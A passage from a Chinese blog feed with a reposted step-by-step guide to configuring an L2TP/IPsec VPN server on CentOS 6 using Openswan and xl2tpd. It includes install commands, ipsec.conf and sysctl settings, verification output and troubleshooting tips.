<p><div id="crayon-5610cfe20b397612733175-3" class="crayon-line"><span class="crayon-v">iptables</span> <span class="crayon-o">-</span><span class="crayon-i">I</span> <span class="crayon-v">FORWARD</span> <span class="crayon-o">-</span><span class="crayon-i">d</span> <span class="crayon-cn">192.168.1.0</span><span class="crayon-o">/</span><span class="crayon-cn">24</span> <span class="crayon-o">-</span><span class="crayon-i">j</span> <span class="crayon-e">ACCEPT</span></div></p>
<p><div id="crayon-5610cfe20b397612733175-4" class="crayon-line crayon-striped-line"><span class="crayon-v">iptables</span><span class="crayon-o">-</span><span class="crayon-e">save</span></div></p>
<p><div id="crayon-5610cfe20b397612733175-5" class="crayon-line"><span class="crayon-e">service </span><span class="crayon-e">iptables </span><span class="crayon-v">restart</span></div><br><br><br><br><br><br><br>最后</p>
<p><div id="crayon-5610cfe20b3a6192680207" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3a6192680207-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b3a6192680207-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3a6192680207-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b3a6192680207-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3a6192680207-5">5</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b3a6192680207-1" class="crayon-line"><span class="crayon-e">service </span><span class="crayon-e">xl2tpd </span><span class="crayon-e">restart</span></div></p>
<p><div id="crayon-5610cfe20b3a6192680207-2" class="crayon-line crayon-striped-line"><span class="crayon-e">service </span><span class="crayon-e">iptables </span><span class="crayon-e">restart</span></div></p>
<p><div id="crayon-5610cfe20b3a6192680207-3" class="crayon-line"><span class="crayon-e">chkconfig </span><span class="crayon-e">xl2tpd </span><span class="crayon-e">on</span></div></p>
<p><div id="crayon-5610cfe20b3a6192680207-4" class="crayon-line crayon-striped-line"><span class="crayon-e">chkconfig </span><span class="crayon-e">iptables </span><span class="crayon-e">on</span></div></p>
<p><div id="crayon-5610cfe20b3a6192680207-5" class="crayon-line"><span class="crayon-e">chkconfig </span><span class="crayon-e">ipsec </span><span class="crayon-v">on</span></div><br><br><br><br><br><br><br>用户配置：</p>
<p><div id="crayon-5610cfe20b3af752229548" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3af752229548-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b3af752229548-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3af752229548-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b3af752229548-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b3af752229548-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b3af752229548-6">6</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b3af752229548-1" class="crayon-line"><span class="crayon-p"># vi /etc/ppp/chap-secrets</span></div></p>
<p><div id="crayon-5610cfe20b3af752229548-2" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b3af752229548-3" class="crayon-line"><span class="crayon-p"># Secrets for authentication using CHAP</span></div></p>
<p><div id="crayon-5610cfe20b3af752229548-4" class="crayon-line crayon-striped-line"><span class="crayon-p"># client        server  secret                  IP addresses</span></div></p>
<p><div id="crayon-5610cfe20b3af752229548-5" class="crayon-line"></div></p>
<p><div id="crayon-5610cfe20b3af752229548-6" class="crayon-line crayon-striped-line">用户<span class="crayon-h">       </span><span class="crayon-o"><em></em></span><span class="crayon-h">       </span>密码<span class="crayon-h">        </span><span class="crayon-o"></span></div><br><br><br><br><br><br><br>参考：<br>在CentOS 6下配置 L2TP IPsec VPN服务器的六步<br><a href="http://yp.oss.org.cn/blog/show_resource.php?resource_id=1586" target="_blank" rel="external">http://yp.oss.org.cn/blog/show_resource.php?resource_id=1586</a><br>CentOS安装L2TP VPN笔记<br><a href="http://xfeng.me/centos-install-l2tp-vpn-note/" target="_blank" rel="external">http://xfeng.me/centos-install-l2tp-vpn-note/</a><br>CentOS安装配置L2TP并结合freeradius验证<br><a href="http://www.xj123.info/3180.html" target="_blank" rel="external">http://www.xj123.info/3180.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在CentOS 6下配置 L2TP IPsec VPN服务器的六步(转)]]></title>
      <url>http://www.linux52.com/2015-10-04-e5-9c-a8centos-6-e4-b8-8b-e9-85-8d-e7-bd-ae-l2tp-ipsec-vpn-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84-e5-85-ad-e6-ad-a5-e8-bd-ac.html</url>
      <content type="html"><![CDATA[<p>原文章<a href="http://blog.jobbole.com/24004/" target="_blank" rel="external">http://blog.jobbole.com/24004/</a></p>
<p><strong>1. 先安装Openswan</strong></p>
<p><div></div></p>
<p><div id="highlighter_362113" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>yum ``install</code> <code>-y ppp iptables ``make</code> <code>gcc gmp-devel xmlto bison flex xmlto libpcap-devel ``lsof</code></div></p>
<p><div class="line number2 index1 alt1"><code>wget http:``//download``.openswan.org``/openswan/openswan-2``.6.38.``tar``.gz</code></div></p>
<p><div class="line number3 index2 alt2"><code>tar</code> <code>zxvf openswan-2.6.38.``tar``.gz</code></div></p>
<p><div class="line number4 index3 alt1"><code>cd</code> <code>openswan-2.6.38</code></div></p>
<p><div class="line number5 index4 alt2"><code>make</code> <code>programs ``install</code></div><br><br><br><br><br><br><br><a href="http://b.gkp.cc/2010/06/19/setup-ipsec-l2tp-on-centos-55/" target="_blank" rel="external">gkp说</a> “安装 Openswan，记得别用2.6.26，宁可用2.6.24。它和 xL2TPD 存在严重兼容性bug”</p>
<p>&nbsp;</p>
<p><strong>2. 安装xL2TPD</strong></p>
<p>在CentOS 6官方的yum源中，没有这个软件包。需要安装fedora的epel源。</p>
<p><div></div></p>
<p><div id="highlighter_863663" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>rpm -Uvh http:``//mirrors``.ustc.edu.cn``/fedora/epel/6/x86_64/epel-release-6-7``.noarch.rpm</code></div></p>
<p><div class="line number2 index1 alt1"><code>#CentOS 5用这个地址：  rpm -Uvh http://mirrors.ustc.edu.cn/fedora/epel/5/i386/epel-release-5-4.noarch.rpm</code></div></p>
<p><div class="line number3 index2 alt2"><code>yum ``install</code> <code>xl2tpd -y</code></div><br><br><br><br><br><br><br>如果上面这个安装地址如果不对了。参照这个fedora epel 的<a href="https://fedoraproject.org/wiki/EPEL/FAQ/zh-cn#How_can_I_install_the_packages_from_the_EPEL_software_repository.3F" target="_blank" rel="external"> faq页</a>。安装其他一些 Linux 软件源，<a href="http://www.esojourn.org/blog/post/repo-sources.php" target="_blank" rel="external">参照这页</a>。</p>
<p>编辑 /etc/ipsec.conf 注意$esojourn.org 替换成你机器的 IP。这个 IP 应该是你的公网 IP，不是本机内网IP。</p>
<p><div></div></p>
<p><div id="highlighter_938456" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><div class="line number12 index11 alt1">12</div></p>
<p><div class="line number13 index12 alt2">13</div></p>
<p><div class="line number14 index13 alt1">14</div></p>
<p><div class="line number15 index14 alt2">15</div></p>
<p><div class="line number16 index15 alt1">16</div></p>
<p><div class="line number17 index16 alt2">17</div></p>
<p><div class="line number18 index17 alt1">18</div></p>
<p><div class="line number19 index18 alt2">19</div></p>
<p><div class="line number20 index19 alt1">20</div></p>
<p><div class="line number21 index20 alt2">21</div></p>
<p><div class="line number22 index21 alt1">22</div></p>
<p><div class="line number23 index22 alt2">23</div></p>
<p><div class="line number24 index23 alt1">24</div></p>
<p><div class="line number25 index24 alt2">25</div></p>
<p><div class="line number26 index25 alt1">26</div></p>
<p><div class="line number27 index26 alt2">27</div></p>
<p><div class="line number28 index27 alt1">28</div></p>
<p><div class="line number29 index28 alt2">29</div></p>
<p><div class="line number30 index29 alt1">30</div></p>
<p><div class="line number31 index30 alt2">31</div></p>
<p><div class="line number32 index31 alt1">32</div></p>
<p><div class="line number33 index32 alt2">33</div></p>
<p><div class="line number34 index33 alt1">34</div></p>
<p><div class="line number35 index34 alt2">35</div></p>
<p><div class="line number36 index35 alt1">36</div></p>
<p><div class="line number37 index36 alt2">37</div></p>
<p><div class="line number38 index37 alt1">38</div></p>
<p><div class="line number39 index38 alt2">39</div></p>
<p><div class="line number40 index39 alt1">40</div></p>
<p><div class="line number41 index40 alt2">41</div></p>
<p><div class="line number42 index41 alt1">42</div></p>
<p><div class="line number43 index42 alt2">43</div></p>
<p><div class="line number44 index43 alt1">44</div></p>
<p><div class="line number45 index44 alt2">45</div></p>
<p><div class="line number46 index45 alt1">46</div></p>
<p><div class="line number47 index46 alt2">47</div></p>
<p><div class="line number48 index47 alt1">48</div></p>
<p><div class="line number49 index48 alt2">49</div></p>
<p><div class="line number50 index49 alt1">50</div></p>
<p><div class="line number51 index50 alt2">51</div></p>
<p><div class="line number52 index51 alt1">52</div></p>
<p><div class="line number53 index52 alt2">53</div></p>
<p><div class="line number54 index53 alt1">54</div></p>
<p><div class="line number55 index54 alt2">55</div></p>
<p><div class="line number56 index55 alt1">56</div></p>
<p><div class="line number57 index56 alt2">57</div></p>
<p><div class="line number58 index57 alt1">58</div></p>
<p><div class="line number59 index58 alt2">59</div></p>
<p><div class="line number60 index59 alt1">60</div></p>
<p><div class="line number61 index60 alt2">61</div></p>
<p><div class="line number62 index61 alt1">62</div></p>
<p><div class="line number63 index62 alt2">63</div></p>
<p><div class="line number64 index63 alt1">64</div></p>
<p><div class="line number65 index64 alt2">65</div></p>
<p><div class="line number66 index65 alt1">66</div></p>
<p><div class="line number67 index66 alt2">67</div></p>
<p><div class="line number68 index67 alt1">68</div></p>
<p><div class="line number69 index68 alt2">69</div></p>
<p><div class="line number70 index69 alt1">70</div></p>
<p><div class="line number71 index70 alt2">71</div></p>
<p><div class="line number72 index71 alt1">72</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code># /etc/ipsec.conf - Openswan IPsec configuration file# This file: /usr/local/share/doc/openswan/ipsec.conf-sample</code></div></p>
<p><div class="line number2 index1 alt1"><code>#</code></div></p>
<p><div class="line number3 index2 alt2"><code># Manual: ipsec.conf.5version 2.0</code></div></p>
<p><div class="line number4 index3 alt1"><code># conforms to second version of ipsec.conf specification# basic configuration</code></div></p>
<p><div class="line number5 index4 alt2"><code>config setup</code></div></p>
<p><div class="line number6 index5 alt1"><code># Do not set debug options to debug configuration issues!</code></div></p>
<p><div class="line number7 index6 alt2"><code># plutodebug / klipsdebug = &quot;all&quot;, &quot;none&quot; or a combation from below:</code></div></p>
<p><div class="line number8 index7 alt1"><code># &quot;raw crypt parsing emitting control klips pfkey natt x509 dpd private&quot;</code></div></p>
<p><div class="line number9 index8 alt2"><code># eg:</code></div></p>
<p><div class="line number10 index9 alt1"><code># plutodebug=&quot;control parsing&quot;</code></div></p>
<p><div class="line number11 index10 alt2"><code># Again: only enable plutodebug or klipsdebug when asked by a developer</code></div></p>
<p><div class="line number12 index11 alt1"><code>#</code></div></p>
<p><div class="line number13 index12 alt2"><code># enable to get logs per-peer</code></div></p>
<p><div class="line number14 index13 alt1"><code># plutoopts=&quot;--perpeerlog&quot;</code></div></p>
<p><div class="line number15 index14 alt2"><code>#</code></div></p>
<p><div class="line number16 index15 alt1"></div></p>
<p><div class="line number17 index16 alt2"><code># Enable core dumps (might require system changes, like ulimit -C)</code></div></p>
<p><div class="line number18 index17 alt1"><code># This is required for abrtd to work properly</code></div></p>
<p><div class="line number19 index18 alt2"><code># Note: incorrect SElinux policies might prevent pluto writing the core</code></div></p>
<p><div class="line number20 index19 alt1"><code>dumpdir=``/var/run/pluto/</code></div></p>
<p><div class="line number21 index20 alt2"><code>#</code></div></p>
<p><div class="line number22 index21 alt1"><code># NAT-TRAVERSAL support, see README.NAT-Traversal</code></div></p>
<p><div class="line number23 index22 alt2"><code>nat_traversal=``yes</code></div></p>
<p><div class="line number24 index23 alt1"><code># exclude networks used on server side by adding %v4:!a.b.c.0/24</code></div></p>
<p><div class="line number25 index24 alt2"><code># It seems that T-Mobile in the US and Rogers/Fido in Canada are</code></div></p>
<p><div class="line number26 index25 alt1"><code># using 25/8 as &quot;private&quot; address space on their 3G network.</code></div></p>
<p><div class="line number27 index26 alt2"><code># This range has not been announced via BGP (at least upto 2010-12-21)</code></div></p>
<p><div class="line number28 index27 alt1"><code>virtual_private=%v4:10.0.0.0``/8``,%v4:192.168.0.0``/16``,%v4:172.16.0.0``/12``,%v4:25.0.0.0``/8``,%v6:fd00::``/8``,%v6:fe80::``/10</code></div></p>
<p><div class="line number29 index28 alt2"><code># OE is now off by default. Uncomment and change to on, to enable.</code></div></p>
<p><div class="line number30 index29 alt1"><code>oe=off</code></div></p>
<p><div class="line number31 index30 alt2"><code># which IPsec stack to use. auto will try netkey, then klips then mast</code></div></p>
<p><div class="line number32 index31 alt1"></div></p>
<p><div class="line number33 index32 alt2"><code>protostack=netkey</code></div></p>
<p><div class="line number34 index33 alt1"><code>#这里注释说可以用auto，但实际上不行。还得老老实实写netkey</code></div></p>
<p><div class="line number35 index34 alt2"></div></p>
<p><div class="line number36 index35 alt1"><code># Use this to log to a file, or disable logging on embedded systems (like openwrt)</code></div></p>
<p><div class="line number37 index36 alt2"><code>#plutostderrlog=/dev/null</code></div></p>
<p><div class="line number38 index37 alt1"></div></p>
<p><div class="line number39 index38 alt2"><code># Add connections here</code></div></p>
<p><div class="line number40 index39 alt1"></div></p>
<p><div class="line number41 index40 alt2"><code># sample VPN connection</code></div></p>
<p><div class="line number42 index41 alt1"><code># for more examples, see /etc/ipsec.d/examples/</code></div></p>
<p><div class="line number43 index42 alt2"><code>#conn sample</code></div></p>
<p><div class="line number44 index43 alt1"><code>#               # Left security gateway, subnet behind it, nexthop toward right.</code></div></p>
<p><div class="line number45 index44 alt2"><code>#               left=10.0.0.1</code></div></p>
<p><div class="line number46 index45 alt1"><code>#               leftsubnet=172.16.0.0/24</code></div></p>
<p><div class="line number47 index46 alt2"><code>#               leftnexthop=10.22.33.44</code></div></p>
<p><div class="line number48 index47 alt1"><code>#               # Right security gateway, subnet behind it, nexthop toward left.</code></div></p>
<p><div class="line number49 index48 alt2"><code>#               right=10.12.12.1</code></div></p>
<p><div class="line number50 index49 alt1"><code>#               rightsubnet=192.168.0.0/24</code></div></p>
<p><div class="line number51 index50 alt2"><code>#               rightnexthop=10.101.102.103</code></div></p>
<p><div class="line number52 index51 alt1"><code>#               # To authorize this connection, but not actually start it,</code></div></p>
<p><div class="line number53 index52 alt2"><code>#               # at startup, uncomment this.</code></div></p>
<p><div class="line number54 index53 alt1"><code>#               #auto=add</code></div></p>
<p><div class="line number55 index54 alt2"></div></p>
<p><div class="line number56 index55 alt1"><code>conn L2TP-PSK-NAT</code></div></p>
<p><div class="line number57 index56 alt2"><code>rightsubnet=vhost:%priv</code></div></p>
<p><div class="line number58 index57 alt1"><code>also=L2TP-PSK-noNAT</code></div></p>
<p><div class="line number59 index58 alt2"></div></p>
<p><div class="line number60 index59 alt1"><code>conn L2TP-PSK-noNAT</code></div></p>
<p><div class="line number61 index60 alt2"><code>authby=secret</code></div></p>
<p><div class="line number62 index61 alt1"><code>pfs=no</code></div></p>
<p><div class="line number63 index62 alt2"><code>auto=add</code></div></p>
<p><div class="line number64 index63 alt1"><code>keyingtries=3</code></div></p>
<p><div class="line number65 index64 alt2"><code>rekey=no</code></div></p>
<p><div class="line number66 index65 alt1"><code>ikelifetime=8h</code></div></p>
<p><div class="line number67 index66 alt2"><code>keylife=1h</code></div></p>
<p><div class="line number68 index67 alt1"><code>type``=transport</code></div></p>
<p><div class="line number69 index68 alt2"><code>left=$esojourn.org ``#这里写公网IP，没固定IP的就到花生壳弄个动态域名解析。</code></div></p>
<p><div class="line number70 index69 alt1"><code>leftid=$esojourn.org</code></div></p>
<p><div class="line number71 index70 alt2"><code>leftprotoport=17``/1701</code></div></p>
<p><div class="line number72 index71 alt1"><code>right=%any</code></div><br><br><br><br><br><br><br>修改 ipsec 密钥</p>
<p><div></div></p>
<p><div id="highlighter_419792" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>vi</code> <code>/etc/ipsec``.secretswww.esojourn.org %any: PSK ``&quot;myps&quot;</code></div></p>
<p><div class="line number2 index1 alt1"><code>#www.esojourn.org改成公网ip，没固定IP的，就到花生壳弄个动态域名解析。http://www.oray.com/peanuthull/</code></div></p>
<p><div class="line number3 index2 alt2"><code>#myps改成密码</code></div><br><br><br><br><br><br><br>&nbsp;</p>
<p><strong>3. 修改/etc/sysctl.conf，开启路由功能</strong></p>
<p><div></div></p>
<p><div id="highlighter_973552" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>vi</code> <code>/etc/sysctl``.conf</code></div><br><br><br><br><br><br><br><a href="http://hi.baidu.com/guolibo/blog/item/e54d8101d014d6f6267fb575.html" target="_blank" rel="external">星云说</a>：将下面两项找到：</p>
<p><div></div></p>
<p><div id="highlighter_64407" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>net.ipv4.ip_forward = 0</code></div></p>
<p><div class="line number2 index1 alt1"><code>net.ipv4.conf.default.rp_filter = 1</code></div><br><br><br><br><br><br><br>改为：</p>
<p><div></div></p>
<p><div id="highlighter_257228" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>net.ipv4.ip_forward = 1</code></div></p>
<p><div class="line number2 index1 alt1"><code>net.ipv4.conf.default.rp_filter = 0</code></div><br><br><br><br><br><br><br>之后先让修改后的配置生效，再测试一下，</p>
<p><div></div></p>
<p><div id="highlighter_647575" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>sysctl -p</code></div></p>
<p><div class="line number2 index1 alt1"><code>service ipsec start</code></div></p>
<p><div class="line number3 index2 alt2"><code>ipsec verify</code></div><br><br><br><br><br><br><br>如果行了就这样了，但实际上，我反复测试之后，干脆在sysctl.conf最下面，加了这一段。加好后别忘了再sysctl -p一下。</p>
<p><div></div></p>
<p><div id="highlighter_717281" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>#added for xl2tpd</code></div></p>
<p><div class="line number2 index1 alt1"><code>net.ipv4.ip_forward = 1</code></div></p>
<p><div class="line number3 index2 alt2"><code>net.ipv4.conf.default.rp_filter = 0</code></div></p>
<p><div class="line number4 index3 alt1"><code>net.ipv4.conf.all.send_redirects = 0</code></div></p>
<p><div class="line number5 index4 alt2"><code>net.ipv4.conf.default.send_redirects = 0</code></div></p>
<p><div class="line number6 index5 alt1"><code>net.ipv4.conf.all.log_martians = 0</code></div></p>
<p><div class="line number7 index6 alt2"><code>net.ipv4.conf.default.log_martians = 0</code></div></p>
<p><div class="line number8 index7 alt1"><code>net.ipv4.conf.default.accept_source_route = 0</code></div></p>
<p><div class="line number9 index8 alt2"><code>net.ipv4.conf.all.accept_redirects = 0</code></div></p>
<p><div class="line number10 index9 alt1"><code>net.ipv4.conf.default.accept_redirects = 0</code></div></p>
<p><div class="line number11 index10 alt2"><code>net.ipv4.icmp_ignore_bogus_error_responses = 1</code></div><br><br><br><br><br><br><br>如果 ipsec verify 返回这样，就可以了。linode</p>
<p><div></div></p>
<p><div id="highlighter_554407" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><div class="line number7 index6 alt2">7</div></p>
<p><div class="line number8 index7 alt1">8</div></p>
<p><div class="line number9 index8 alt2">9</div></p>
<p><div class="line number10 index9 alt1">10</div></p>
<p><div class="line number11 index10 alt2">11</div></p>
<p><div class="line number12 index11 alt1">12</div></p>
<p><div class="line number13 index12 alt2">13</div></p>
<p><div class="line number14 index13 alt1">14</div></p>
<p><div class="line number15 index14 alt2">15</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>Checking your system to see ``if</code> <code>IPsec got installed and started correctly:</code></div></p>
<p><div class="line number2 index1 alt1"><code>Version check and ipsec on-path                                 [OK]</code></div></p>
<p><div class="line number3 index2 alt2"><code>Linux Openswan U2.6.24``/K2``.6.32.16-linode28 (netkey)</code></div></p>
<p><div class="line number4 index3 alt1"><code>Checking ``for</code> <code>IPsec support ``in</code> <code>kernel                            [OK]</code></div></p>
<p><div class="line number5 index4 alt2"><code>NETKEY detected, testing ``for</code> <code>disabled ICMP send_redirects       [OK]</code></div></p>
<p><div class="line number6 index5 alt1"><code>NETKEY detected, testing ``for</code> <code>disabled ICMP accept_redirects     [OK]</code></div></p>
<p><div class="line number7 index6 alt2"><code>Checking ``for</code> <code>RSA private key (``/etc/ipsec``.secrets)               [OK]</code></div></p>
<p><div class="line number8 index7 alt1"><code>Checking that pluto is running                                  [OK]</code></div></p>
<p><div class="line number9 index8 alt2"><code>Pluto listening ``for</code> <code>IKE on udp 500                              [OK]</code></div></p>
<p><div class="line number10 index9 alt1"><code>Pluto listening ``for</code> <code>NAT-T on udp 4500                           [OK]</code></div></p>
<p><div class="line number11 index10 alt2"><code>Two or ``more</code> <code>interfaces found, checking IP forwarding            [OK]</code></div></p>
<p><div class="line number12 index11 alt1"><code>Checking NAT and MASQUERADEing</code></div></p>
<p><div class="line number13 index12 alt2"><code>Checking ``for</code> <code>&#39;ip&#39;</code> <code>command</code>                                       <code>[OK]</code></div></p>
<p><div class="line number14 index13 alt1"><code>Checking ``for</code> <code>&#39;iptables&#39;</code> <code>command</code>                                 <code>[OK]</code></div></p>
<p><div class="line number15 index14 alt2"><code>Opportunistic Encryption Support                                [DISABLED]</code></div><br><br><br><br><br><br><br>我的经验中，这里可能会出这么几个故障：</p>
<p>第一：</p>
<p><div></div></p>
<p><div id="highlighter_985757" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>SAref kernel support                                  [N``/A``]</code></div><br><br><br><br><br><br><br>这样的话， /etc/xl2tpd/xl2tpd.conf这个文件里</p>
<p><div></div></p>
<p><div id="highlighter_194208" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>[global]</code></div></p>
<p><div class="line number2 index1 alt1"><code>ipsec saref = no</code></div><br><br><br><br><br><br><br>第二：</p>
<p><div></div></p>
<p><div id="highlighter_672109" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
<p><div class="line number1 index0 alt2"><code>Two or ``more</code> <code>interfaces found, checking IP forwarding      [FAILED]</code></div></p>
<p><div class="line number2 index1 alt1"><code>Checking NAT and MASQUERADEing                                [OK]</code></div><br><br><br><br><br><br><br>ip转发检查失败。</p>
<p><a href="https://lists.openswan.org/pipermail/users/2010-May/018841.html" target="_blank" rel="external">Paul和Steve说：</a>只要 cat /proc/sys/net/ipv4/ip_forward 返回结果是1就没事。这个我已经证实了。</p>
<p>第三：返回结果里，就没有Two or more interfaces found, checking IP forwarding和Checking NAT and MASQUERADEing这两项。碰上这个我也没办法了。重装了系统，又瞎折腾一通之后就好了。</p>
<p>[ 2012-7-6 ]<br>第四：更新加入一个新的情况</p>
<p><div></div></p>
<p><div id="highlighter_86418" class="syntaxhighlighter notranslate shell"></div></p>
<p><table border="0" cellspacing="0" cellpadding="0"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td class="gutter"></td></p>
<p><div class="line number1 index0 alt2">1</div></p>
<p><div class="line number2 index1 alt1">2</div></p>
<p><div class="line number3 index2 alt2">3</div></p>
<p><div class="line number4 index3 alt1">4</div></p>
<p><div class="line number5 index4 alt2">5</div></p>
<p><div class="line number6 index5 alt1">6</div></p>
<p><td class="code"></td></p>
<p><div class="container"></div></p>
